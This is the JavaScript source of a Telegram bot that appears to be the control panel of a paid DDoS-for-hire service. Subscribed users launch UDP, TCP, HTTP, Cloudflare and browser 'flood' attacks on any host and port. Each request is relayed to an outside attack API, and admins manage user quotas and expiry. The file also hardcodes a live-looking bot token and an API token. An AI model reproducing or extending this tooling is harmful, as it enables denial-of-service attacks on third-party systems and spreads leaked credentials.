// bot.js - Main Telegram Bot File
const { Telegraf } = require('telegraf');
const fs = require('fs');
const axios = require('axios');
const moment = require('moment');

// Load configuration
let config = {};
try {
  config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
} catch (error) {
  // Create default config if file doesn't exist
  config = {
    users: {},
    adminId: 6456655262,
    notificationGroupId: -4764306375,
    apiUrl: "https://apikey-production.up.railway.app/api/attack",
    apiToken: "dispenser"
  };
  fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
}

// Load attack methods
let methods = [];
try {
  methods = JSON.parse(fs.readFileSync('./methods.json', 'utf8'));
} catch (error) {
  console.error('Error loading methods.json:', error.message);
  // Create default methods if file doesn't exist
  methods = [
    { "name": "UDP", "description": "UDP flood method" },
    { "name": "SPIKE", "description": "TCP flood method" },
    { "name": "HTTP", "description": "HTTP flood method" },
    { "name": "CF", "description": "CF flood method" },
    { "name": "BROWSER", "description": "Browser flood method" }
  ];
  fs.writeFileSync('./methods.json', JSON.stringify(methods, null, 2));
}

// Initialize bot
const bot = new Telegraf('7177796181:AAG6SwfRa7ajhCsIPITPbmYHydU3VuqHkbg');

// Track ongoing attacks
const ongoingAttacks = new Map();

// Helper function to save config
function saveConfig() {
  fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
}

// Helper function to check if user exists and has access
function checkUserAccess(userId) {
  return config.users[userId] !== undefined;
}

// Helper function to check if user is admin
function isAdmin(userId) {
  return parseInt(userId) === config.adminId;
}

// Helper function to check if user has available slots
function hasAvailableSlot(userId) {
  const user = config.users[userId];
  if (!user) return false;
  
  // Count user's ongoing attacks
  let userOngoingAttacks = 0;
  ongoingAttacks.forEach((attack) => {
    if (attack.userId === userId) userOngoingAttacks++;
  });
  
  return userOngoingAttacks < user.concurrentLimit;
}

// Helper function to check if user token is valid
function isValidToken(userId) {
  const user = config.users[userId];
  if (!user) return false;
  
  // Check if user has an expiry date and if it's passed
  if (user.expiryDate) {
    const now = moment();
    const expiry = moment(user.expiryDate, 'YYYY-MM-DD');
    if (now.isAfter(expiry)) return false;
  }
  
  return true;
}

// Format time remaining for a user's token
function formatTimeRemaining(userId) {
  const user = config.users[userId];
  if (!user || !user.expiryDate) return "No expiry date set";
  
  const now = moment();
  const expiry = moment(user.expiryDate, 'YYYY-MM-DD');
  if (now.isAfter(expiry)) return "Expired";
  
  const days = expiry.diff(now, 'days');
  return `${days} days remaining`;
}

// Start command
bot.start((ctx) => {
  ctx.reply('Welcome to the Attack Management Bot. Use /help to see available commands.');
});

// Help command
bot.help((ctx) => {
  if (isAdmin(ctx.from.id)) {
    ctx.reply(
      'Available commands:\n' +
      '/attack host port time method - Launch an attack\n' +
      '/methods - Show available attack methods\n' +
      '/status - Check your account status\n' +
      '/ongoing - List all ongoing attacks\n' +
      '/stop attackId - Stop a specific attack\n\n' +
      'Admin commands:\n' +
      '/addusr userId token maxTime concurrentLimit expiryDays - Add a new user\n' +
      '/delusr userId - Delete a user\n' +
      '/updateusr userId token|maxTime|concurrentLimit|expiryDays value - Update user property\n' +
      '/listusers - List all users'
    );
  } else if (checkUserAccess(ctx.from.id)) {
    ctx.reply(
      'Available commands:\n' +
      '/attack host port time method - Launch an attack\n' +
      '/methods - Show available attack methods\n' +
      '/status - Check your account status\n' +
      '/ongoing - List your ongoing attacks\n' +
      '/stop attackId - Stop a specific attack'
    );
  } else {
    ctx.reply('You do not have access to this bot. Please contact the administrator.');
  }
});

// Attack command
bot.command('attack', async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // Check if user has access
  if (!checkUserAccess(userId)) {
    return ctx.reply('You do not have access to this bot. Please contact the administrator.');
  }
  
  // Check if token is valid (not expired)
  if (!isValidToken(userId)) {
    return ctx.reply('Your token has expired. Please contact the administrator.');
  }
  
  // Check if user has available slots
  if (!hasAvailableSlot(userId)) {
    return ctx.reply(`You have reached your concurrent attack limit (${config.users[userId].concurrentLimit}).`);
  }
  
  // Parse command parameters
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length !== 4) {
    return ctx.reply('Usage: /attack host port time method\nUse /methods to see available attack methods.');
  }
  
  const [host, port, time, method] = args;
  
  // Validate parameters
  if (!host || !port || !time || !method) {
    return ctx.reply('All parameters are required.');
  }
  
  // Validate method
  const validMethod = methods.find(m => m.name.toUpperCase() === method.toUpperCase());
  if (!validMethod) {
    return ctx.reply(`Invalid method: ${method}\nUse /methods to see available attack methods.`);
  }
  
  // Check if time is within user's limit
  const maxTime = config.users[userId].maxTime;
  if (parseInt(time) > maxTime) {
    return ctx.reply(`Attack time exceeds your limit of ${maxTime} seconds.`);
  }
  
  // Generate unique attack ID
  const attackId = Date.now().toString();
  
  try {
    // Send notification to the group
    await bot.telegram.sendMessage(
      config.notificationGroupId,
      `🚨 Attack launched by User ID: ${userId}\n` +
      `🎯 Target: ${host}:${port}\n` +
      `⏱️ Duration: ${time} seconds\n` +
      `🔧 Method: ${method}\n` +
      `🔑 Attack ID: ${attackId}`
    );
    
    // Send request to API
    const apiUrl = `${config.apiUrl}?token=${config.apiToken}&target=${host}&time=${time}&method=${method}&port=${port}`;
    const response = await axios.get(apiUrl);
    
    // Store attack details
    ongoingAttacks.set(attackId, {
      userId,
      host,
      port,
      time: parseInt(time),
      method,
      startTime: Date.now(),
      attackId
    });
    
    // Auto-remove attack after duration + 2s buffer
    setTimeout(() => {
      ongoingAttacks.delete(attackId);
      ctx.reply(`Attack ${attackId} has completed.`);
    }, parseInt(time) * 1000 + 2000);
    
    // Reply to user
    ctx.reply(
      `✅ Attack launched successfully!\n` +
      `🎯 Target: ${host}:${port}\n` +
      `⏱️ Duration: ${time} seconds\n` +
      `🔧 Method: ${method}\n` +
      `🔑 Attack ID: ${attackId}`
    );
    
  } catch (error) {
    console.error('API Error:', error.message);
    ctx.reply(`❌ Error launching attack: ${error.message}`);
  }
});

// Status command
bot.command('status', (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!checkUserAccess(userId)) {
    return ctx.reply('You do not have access to this bot. Please contact the administrator.');
  }
  
  const user = config.users[userId];
  
  // Count user's ongoing attacks
  let userOngoingAttacks = 0;
  ongoingAttacks.forEach((attack) => {
    if (attack.userId === userId) userOngoingAttacks++;
  });
  
  ctx.reply(
    `📊 Account Status:\n` +
    `👤 User ID: ${userId}\n` +
    `⏱️ Max Time: ${user.maxTime} seconds\n` +
    `🔢 Concurrent Limit: ${user.concurrentLimit}\n` +
    `🔄 Currently Running: ${userOngoingAttacks}/${user.concurrentLimit}\n` +
    `⏳ Subscription: ${formatTimeRemaining(userId)}`
  );
});

// List ongoing attacks
bot.command('ongoing', (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!checkUserAccess(userId)) {
    return ctx.reply('You do not have access to this bot. Please contact the administrator.');
  }
  
  if (ongoingAttacks.size === 0) {
    return ctx.reply('No ongoing attacks.');
  }
  
  let message = '🔄 Ongoing Attacks:\n\n';
  
  // For admins, show all attacks; for users, only show their attacks
  ongoingAttacks.forEach((attack) => {
    if (isAdmin(userId) || attack.userId === userId) {
      const elapsedTime = Math.floor((Date.now() - attack.startTime) / 1000);
      const remainingTime = Math.max(0, attack.time - elapsedTime);
      
      message += 
        `🔑 ID: ${attack.attackId}\n` +
        `👤 User: ${attack.userId}\n` +
        `🎯 Target: ${attack.host}:${attack.port}\n` +
        `⏱️ Time: ${elapsedTime}s / ${attack.time}s (${remainingTime}s remaining)\n` +
        `🔧 Method: ${attack.method}\n\n`;
    }
  });
  
  if (message === '🔄 Ongoing Attacks:\n\n') {
    return ctx.reply('You have no ongoing attacks.');
  }
  
  ctx.reply(message);
});

// Stop attack command
bot.command('stop', (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!checkUserAccess(userId)) {
    return ctx.reply('You do not have access to this bot. Please contact the administrator.');
  }
  
  const attackId = ctx.message.text.split(' ')[1];
  if (!attackId) {
    return ctx.reply('Usage: /stop attackId');
  }
  
  const attack = ongoingAttacks.get(attackId);
  if (!attack) {
    return ctx.reply(`Attack with ID ${attackId} not found.`);
  }
  
  // Only admins or the attack owner can stop an attack
  if (!isAdmin(userId) && attack.userId !== userId) {
    return ctx.reply('You do not have permission to stop this attack.');
  }
  
  // Remove attack from ongoing list
  ongoingAttacks.delete(attackId);
  
  // In a real implementation, you would call an API to stop the attack here
  
  ctx.reply(`✅ Attack ${attackId} has been stopped.`);
});

// Admin commands
// Add user
bot.command('addusr', (ctx) => {
  const adminId = ctx.from.id.toString();
  
  if (!isAdmin(adminId)) {
    return ctx.reply('You are not authorized to use this command.');
  }
  
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length !== 5) {
    return ctx.reply('Usage: /addusr userId token maxTime concurrentLimit expiryDays');
  }
  
  const [userId, token, maxTime, concurrentLimit, expiryDays] = args;
  
  // Calculate expiry date
  const expiryDate = moment().add(parseInt(expiryDays), 'days').format('YYYY-MM-DD');
  
  // Add user to config
  config.users[userId] = {
    token,
    maxTime: parseInt(maxTime),
    concurrentLimit: parseInt(concurrentLimit),
    expiryDate
  };
  
  saveConfig();
  
  ctx.reply(
    `✅ User added successfully!\n` +
    `👤 User ID: ${userId}\n` +
    `🔑 Token: ${token}\n` +
    `⏱️ Max Time: ${maxTime} seconds\n` +
    `🔢 Concurrent Limit: ${concurrentLimit}\n` +
    `📅 Expires on: ${expiryDate}`
  );
});

// Delete user
bot.command('delusr', (ctx) => {
  const adminId = ctx.from.id.toString();
  
  if (!isAdmin(adminId)) {
    return ctx.reply('You are not authorized to use this command.');
  }
  
  const userId = ctx.message.text.split(' ')[1];
  if (!userId) {
    return ctx.reply('Usage: /delusr userId');
  }
  
  if (!config.users[userId]) {
    return ctx.reply(`User ${userId} not found.`);
  }
  
  delete config.users[userId];
  saveConfig();
  
  ctx.reply(`✅ User ${userId} has been deleted.`);
});

// Update user property
bot.command('updateusr', (ctx) => {
  const adminId = ctx.from.id.toString();
  
  if (!isAdmin(adminId)) {
    return ctx.reply('You are not authorized to use this command.');
  }
  
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length !== 3) {
    return ctx.reply('Usage: /updateusr userId property value');
  }
  
  const [userId, property, value] = args;
  
  if (!config.users[userId]) {
    return ctx.reply(`User ${userId} not found.`);
  }
  
  switch (property) {
    case 'token':
      config.users[userId].token = value;
      break;
    case 'maxTime':
      config.users[userId].maxTime = parseInt(value);
      break;
    case 'concurrentLimit':
      config.users[userId].concurrentLimit = parseInt(value);
      break;
    case 'expiryDays':
      const expiryDate = moment().add(parseInt(value), 'days').format('YYYY-MM-DD');
      config.users[userId].expiryDate = expiryDate;
      break;
    default:
      return ctx.reply('Invalid property. Valid properties: token, maxTime, concurrentLimit, expiryDays');
  }
  
  saveConfig();
  
  ctx.reply(`✅ User ${userId} updated successfully. ${property} set to ${value}.`);
});

// List all users
bot.command('listusers', (ctx) => {
  const adminId = ctx.from.id.toString();
  
  if (!isAdmin(adminId)) {
    return ctx.reply('You are not authorized to use this command.');
  }
  
  const userIds = Object.keys(config.users);
  
  if (userIds.length === 0) {
    return ctx.reply('No users found.');
  }
  
  let message = '👥 User List:\n\n';
  
  userIds.forEach((userId) => {
    const user = config.users[userId];
    message += 
      `👤 User ID: ${userId}\n` +
      `⏱️ Max Time: ${user.maxTime} seconds\n` +
      `🔢 Concurrent Limit: ${user.concurrentLimit}\n` +
      `⏳ Subscription: ${formatTimeRemaining(userId)}\n\n`;
  });
  
  ctx.reply(message);
});

// List available methods
bot.command('methods', (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!checkUserAccess(userId)) {
    return ctx.reply('You do not have access to this bot. Please contact the administrator.');
  }
  
  let message = '🔧 Available Attack Methods:\n\n';
  
  methods.forEach((method) => {
    message += `• ${method.name} - ${method.description}\n`;
  });
  
  message += '\nUsage: /attack host port time method';
  
  ctx.reply(message);
});

// Handle errors
bot.catch((err, ctx) => {
  console.error('Bot error:', err);
  ctx.reply('An error occurred. Please try again later.');
});

// Start bot
bot.launch().then(() => {
  console.log('Bot is running...');
}).catch(err => {
  console.error('Failed to start bot:', err);
});

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
